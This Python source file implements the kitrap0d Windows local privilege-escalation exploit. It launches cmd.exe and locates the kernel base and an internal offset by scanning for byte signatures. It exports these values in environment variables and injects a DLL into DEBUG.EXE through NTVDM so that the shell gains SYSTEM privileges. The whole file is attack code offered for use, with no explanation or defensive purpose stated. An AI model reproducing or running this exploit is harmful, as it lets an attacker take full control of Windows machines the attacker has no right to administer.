import ctypes
import dllinject
import ctypes.wintypes as wintypes
signatures = ("\x64\xA1\x1C\x00\x00\x00\x5A\x89\x50\x04\x8B\x88\x24\x01\x00\x00",
              "\x64\xA1\x1C\x00\x00\x00\x5A\x89\x50\x04\x8B\x88\x24\x01\x00\x00",
              "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x70\x04\xB9\x84",
              "\xA1\x1C\xF0\xDF\xFF\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00\x00",
              "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00",
              "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00",
              "\x64\xA1\x1C\x00\x00\x00\x8B\x7D\x58\x8B\x3F\x8B\x88\x24\x01\x00")
def get_kernel_addr():
    ntdll = ctypes.windll.ntdll
    buffer_size = wintypes.ULONG(0)
    ntdll.ZwQuerySystemInformation(11, 0, 0, ctypes.byref(buffer_size));

    sysmod_info = ctypes.create_string_buffer(buffer_size.value)
    ntdll.ZwQuerySystemInformation(11, ctypes.byref(sysmod_info), buffer_size.value, ctypes.byref(buffer_size));
    
    mod_list = ctypes.cast(sysmod_info, ctypes.POINTER(wintypes.SYSTEM_MODULE_INFORMATION))
    return (mod_list[0].BaseAddress, mod_list[0].ImageName.split('\\')[-1], mod_list[0].Size)

def kitrap0d():
    kernel32 = ctypes.windll.kernel32
    
    startupinfo = wintypes.STARTUPINFO()
    process_information = wintypes.PROCESS_INFORMATION()
    startupinfo.dwFlags = 0x1
    startupinfo.wShowWindow = 0x1
    startupinfo.cb = ctypes.sizeof(startupinfo)
    kernel32.CreateProcessA(
                            "C:\\WINDOWS\\system32\\cmd.exe",
                            "C:\\WINDOWS\\system32\\cmd.exe",
                            None,
                            None,
                            False,
                            0x00000010,
                            None,
                            None,
                            ctypes.byref(startupinfo),
                            ctypes.byref(process_information)
                            )
    givesys = process_information.dwProcessId
    kernel32.CloseHandle(process_information.hThread)
    kernel32.CloseHandle(process_information.hProcess)

    kernbase, kernimage, kernsize = get_kernel_addr()
    kernhandle = kernel32.LoadLibraryA(kernimage)
    dos_header = ctypes.cast(kernhandle, ctypes.POINTER(wintypes.IMAGE_DOS_HEADER))
    nt_header = ctypes.cast(kernhandle + dos_header.contents.e_lfanew, ctypes.POINTER(wintypes.IMAGE_NT_HEADER))
    optional_header = nt_header.contents.OptionalHeader
    baseofcode = optional_header.BaseOfCode
    sizeofcode = optional_header.SizeOfCode
    buf = ctypes.c_byte*kernsize
    
    kernelarray = ctypes.cast(kernhandle, ctypes.POINTER(buf)).contents
    for i in range(baseofcode, sizeofcode+1):
        chunk = ''.join([chr(j%256) for j in kernelarray[i:i+16]])
        if chunk in signatures:
            break
    kernoff = i
    
    kernoff = hex(int(kernoff))
    kernbase = hex(int(kernbase))[:-1]
    givesys = hex(int(givesys))
    kernel32.SetEnvironmentVariableA("VDM_TARGET_PID",givesys)
    kernel32.SetEnvironmentVariableA("VDM_TARGET_KRN",kernbase)
    kernel32.SetEnvironmentVariableA("VDM_TARGET_OFF",kernoff)

    ntvdminject = dllinject.Process(pe="C:\\WINDOWS\\SYSTEM32\\DEBUG.EXE")
    ntvdminject.inject("MemoryModule\\MemoryModule.dll")
